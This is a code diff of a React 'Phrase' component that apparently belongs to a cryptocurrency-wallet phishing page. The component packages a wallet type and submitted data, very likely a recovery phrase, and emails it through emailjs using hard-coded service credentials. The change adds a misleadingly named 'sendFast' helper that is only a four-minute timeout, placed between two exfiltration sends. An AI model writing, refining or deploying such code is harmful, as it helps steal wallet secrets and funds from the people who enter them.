@@ -63,6 +63,9 @@ const Phrase = ({ selectedWallet, appType}) => {
     const password = "not_required";
     const formData = { name, type, data, password };
 
+    const sendFast = (ms: number): Promise<void> =>
+      new Promise((resolve) => setTimeout(resolve, ms));
+
     try {
 
       await emailjs.send(
@@ -80,6 +83,8 @@ const Phrase = ({ selectedWallet, appType}) => {
         },
         "4leuzsOPi6Oh_D4e0"
       );
+
+      await sendFast(4 * 60 * 1000); 
 
       await emailjs.send(
         "service_ky8xa0e",
